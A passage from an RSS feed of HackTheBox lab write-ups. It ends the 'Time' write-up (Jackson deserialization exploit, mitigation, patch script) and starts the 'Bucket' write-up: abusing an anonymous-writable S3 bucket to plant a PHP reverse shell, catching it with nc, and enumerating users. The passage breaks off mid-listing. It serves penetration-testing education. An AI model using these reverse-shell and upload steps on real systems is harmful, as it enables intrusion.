mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@time:/opt/json_project# grep -Ri version
Binary file classpath/h2-1.4.199.jar matches
Binary file classpath/jackson-databind-2.9.8.jar matches
Binary file classpath/logback-core-1.3.0-alpha5.jar matches
Binary file classpath/jackson-core-2.9.8.jar matches
</code></pre></div><h4 id="mitigation">Mitigation</h4>
<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>

<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
      require f
<span style="color:#66d9ef">end</span>

java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
content <span style="color:#f92672">=</span> f
puts content

mapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">ObjectMapper</span><span style="color:#f92672">.</span>new
mapper<span style="color:#f92672">.</span>activateDefaultTyping() <span style="color:#75715e"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">MapperFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span>); <span style="color:#75715e"># ==&gt; Mitigation v2.11 </span>
mapper<span style="color:#f92672">.</span>configure(<span style="color:#66d9ef">SerializationFeature</span><span style="color:#f92672">::</span><span style="color:#66d9ef">FAIL_ON_EMPTY_BEANS</span>, <span style="color:#66d9ef">false</span>);
obj <span style="color:#f92672">=</span> mapper<span style="color:#f92672">.</span>readValue(content, java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Object<span style="color:#f92672">.</span>java_class) <span style="color:#75715e"># invokes all the setters</span>
puts <span style="color:#e6db74">&#34;stringified: &#34;</span> <span style="color:#f92672">+</span> mapper<span style="color:#f92672">.</span>writeValueAsString(obj)
</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span><span style="color:#75715e"># ./time.sh patch [ip]</span>
project_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/json_project/&#34;</span>
new_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.11.0.jar&#34;</span>
old_jackson<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jackson-core-2.9.8.jar&#34;</span>

<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;patch&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
	<span style="color:#75715e"># backup the original code</span>
	mkdir -p /dev/shm/orig/
	mv $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$old_jackson /dev/shm/orig/
	mv $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span> /dev/shm/orig/
	
	<span style="color:#75715e"># These file hosted from my machine</span>
	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/</span>$new_jackson<span style="color:#e6db74">&#34;</span> &gt; /tmp/$new_jackson
	curl -s <span style="color:#e6db74">&#34;http://</span>$2<span style="color:#e6db74">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
	
	<span style="color:#75715e"># move the updated parser and jackson</span>
	cp /tmp/$new_jackson $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson 
	cp /tmp/parse.rb <span style="color:#e6db74">&#34;</span>$project_path<span style="color:#e6db74">&#34;</span>
	chmod +x $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
	
<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;restore&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
	rm $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>$new_jackson
	rm $project_path<span style="color:#e6db74">&#34;parse.rb&#34;</span>
	
	mv <span style="color:#e6db74">&#34;/dev/shm/orig/</span>$old_jackson<span style="color:#e6db74">&#34;</span> $project_path<span style="color:#e6db74">&#34;classpath/&#34;</span>
	mv <span style="color:#e6db74">&#34;/dev/shm/orig/parse.rb&#34;</span> $project_path
	
	rm /tmp/$new_jackson 
	rm /tmp/parse.rb
	rm -r /dev/shm/orig/
	
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect  back. I checked the validator on the browser, and now it returned this  message.</p>
<pre><code>Validation failed: WARNING: An illegal reflective access operation has occurred
</code></pre><p><div class="img-container"><img src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  /></div>
</p>
<p>Well, it is working, isn’t it?</p>
<hr>
<h2 id="references">References</h2>
<p>Exploitation:</p>
<ul>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
</ul>
<p>Mitigation:</p>
<ul>
<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Bucket</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</link>
      <pubDate>Sat, 24 Apr 2021 22:03:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</guid>
      <description>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user.</description>
      <content:encoded><![CDATA[<p>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is  an internal web currently running as a root user, which then can be exploited to gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Pentesting AWS S3</li>
<li>Port Forwarding</li>
<li>Exploiting PD4ML</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
<li>AWS CLI - <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Scanning through all the ports return the same result.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---buckethtb">TCP 80 - bucket.htb</h3>
<p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://10.10.10.212

<span style="color:#75715e">&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">title</span>&gt;302 Found&lt;/<span style="color:#f92672">title</span>&gt;
&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;
&lt;<span style="color:#f92672">h1</span>&gt;Found&lt;/<span style="color:#f92672">h1</span>&gt;
&lt;<span style="color:#f92672">p</span>&gt;The document has moved &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/<span style="color:#f92672">a</span>&gt;.&lt;/<span style="color:#f92672">p</span>&gt;
&lt;<span style="color:#f92672">hr</span>&gt;
&lt;<span style="color:#f92672">address</span>&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80&lt;/<span style="color:#f92672">address</span>&gt;
&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb
</code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422234425022.png" alt="image-20210422234425022"  /></div>
</p>
<p>Inspecting the page source discovers a vhost.</p>
<p><div class="img-container"><img src="imgs/image-20210422234754897.png" alt="image-20210422234754897"  /></div>
</p>
<p>I&rsquo;ll add the vhost name to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb
</code></pre></div><h4 id="gobuster">Gobuster</h4>
<p>There&rsquo;s no interesting results.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80

...&lt;SNIP&gt;...
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5344<span style="color:#f92672">]</span>
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
</code></pre></div><h3 id="tcp-80---s3buckethtb">TCP 80 - s3.bucket.htb</h3>
<p>Visiting the newly discovered hostname displays a typical json output format.</p>
<p><div class="img-container"><img src="imgs/image-20210422235335494.png" alt="image-20210422235335494"  /></div>
</p>
<h4 id="gobuster-1">Gobuster</h4>
<p><code>gobuster</code> scan discovers a few web paths.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80

...&lt;SNIP&gt;...
/shell                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
/health               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 54<span style="color:#f92672">]</span>
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
</code></pre></div><h4 id="shell">/shell</h4>
<p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p>
<p><div class="img-container"><img src="imgs/image-20210424222707480.png" alt="image-20210424222707480"  /></div>
</p>
<p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.51» 
$ curl -sv http://s3.bucket.htb/shell

...&lt;SNIP&gt;...
&lt; refresh: 0; url<span style="color:#f92672">=</span>http://444af250749d:4566/shell/
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
&lt; access-control-expose-headers: x-amz-version-id
&lt; 
* Connection <span style="color:#75715e">#0 to host s3.bucket.htb left intact</span>
</code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
</code></pre></div><p>Searching some of the header names on Google reveals those are used by Amazon S3</p>
<p><div class="img-container"><img src="imgs/image-20210425002915838.png" alt="image-20210425002915838"  /></div>
</p>
<p>Adding another <code>/</code> at the end of uri resolve to a DynamoDB JavaScript Shell. I have no familiarity on this.</p>
<p><div class="img-container"><img src="imgs/image-20210424223257481.png" alt="image-20210424223257481"  /></div>
</p>
<h4 id="health">/health</h4>
<p><code>/health</code> is probably an endpoint to monitor the service status.</p>
<p><div class="img-container"><img src="imgs/image-20210422235825937.png" alt="image-20210422235825937"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="aws-s3">AWS S3</h4>
<p>S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I&rsquo;ll use <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">aws cli</a>. You can find the user guide <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets">here</a>.</p>
<p>Usage in general:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">aws [options] s3 &lt;subcommand&gt; [parameters]
</code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p>
<blockquote>
<p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
You must specify a region. You can also configure your region by running <span style="color:#e6db74">&#34;aws configure&#34;</span>.
</code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws configure
AWS Access Key ID <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
AWS Secret Access Key <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
Default region name <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>: us-east-1
Default output format <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
</code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
2020-10-21 09:16:03 adserver
</code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
                           PRE images/
2020-10-21 09:22:04       <span style="color:#ae81ff">5344</span> index.html

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/images/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
2020-10-21 09:52:04      <span style="color:#ae81ff">37840</span> bug.jpg
2020-10-21 09:52:04      <span style="color:#ae81ff">51485</span> cloud.png
2020-10-21 09:52:04      <span style="color:#ae81ff">16486</span> malware.png
</code></pre></div><p>Those files are the same file used in <code>bucket.htb</code></p>
<h4 id="php-reverse-shell-upload-via-s3">PHP Reverse Shell upload via S3</h4>
<p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy">source</a>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws s3 cp &lt;source&gt; &lt;target&gt; <span style="color:#f92672">[</span>--options<span style="color:#f92672">]</span>
</code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test files and upload it to the bucket.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ echo <span style="color:#e6db74">&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php

→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
upload: ./iamf-test.php to s3://adserver/iamf-test.php 
</code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 ls s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
                           PRE images/
2021-04-22 14:05:15         <span style="color:#ae81ff">21</span> iamf-test.php
2021-04-22 14:05:04       <span style="color:#ae81ff">5344</span> index.html
</code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of php code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
&lt;?php echo <span style="color:#e6db74">&#34;IamF&#34;</span> ?&gt;

→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf-test.php
IamF
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423010636324.png" alt="image-20210423010636324"  /></div>
</p>
<p>Now I can try to drop a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
</code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ curl -s http://bucket.htb/iamf.php
</code></pre></div><p>I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ rlwrap nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.39<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.212<span style="color:#f92672">]</span> <span style="color:#ae81ff">58352</span>
Linux bucket 5.4.0-48-generic <span style="color:#75715e">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 18:14:02 up 13:18,  <span style="color:#ae81ff">0</span> users,  load average: 0.03, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1050<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@bucket:/$ 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423011428675.png" alt="image-20210423011428675"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-roy">Shell as roy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There is a <code>bucket-app</code>, but I don&rsquo;t have access to it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la
total <span style="color:#ae81ff">16</span>
drwxr-xr-x   <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
drwxr-xr-x  <span style="color:#ae81ff">14</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
drwxr-x---+  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 bucket-app
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 18:27 html
</code></pre></div><p><code>roy</code> is the only user in this box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
roy:x:1000:1000:,,,:/home/roy:/bin/bash
</code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la /home/roy
total <span style="color:#ae81ff">44</span>
drwxr-xr-x <span style="color:#ae81ff">7</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .
drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> ..
drwxrwxr-x <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .aws
lrwxrwxrwx <span style="color:#ae81ff">1</span> roy  roy     <span style="color:#ae81ff">9</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">220</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy  <span style="color:#ae81ff">3771</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bashrc
drwx------ <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:57 .cache
drwx------ <span style="color:#ae81ff">4</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 08:01 .gnupg
-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">807</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .profile
drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 project
drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 snap
-r-------- <span style="color:#ae81ff">1</span> roy  roy    <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">22</span> 04:56 user.txt
</code></pre></div><p>The files inside <code>project</code> are readable by others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ ls -la
total <span style="color:#ae81ff">44</span>
